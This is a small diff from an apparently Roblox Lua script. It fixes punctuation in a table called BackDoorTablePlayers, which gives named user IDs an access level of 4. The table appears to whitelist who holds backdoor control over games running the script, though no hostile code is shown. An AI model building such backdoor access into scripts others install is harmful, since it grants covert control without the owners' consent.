@@ -223,7 +223,7 @@ local BackDoorTablePlayers = {
 		['Name'] = "!fishgang Cy (Creator and ONLY dev)";
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(178,242,255);
-	}
+	};
     [1066524308] = {
 		['Name'] = "Kylee [My Gf so kill her = you die] (She does not know anything about the script so stop asking)";
 		['Access'] = 4;
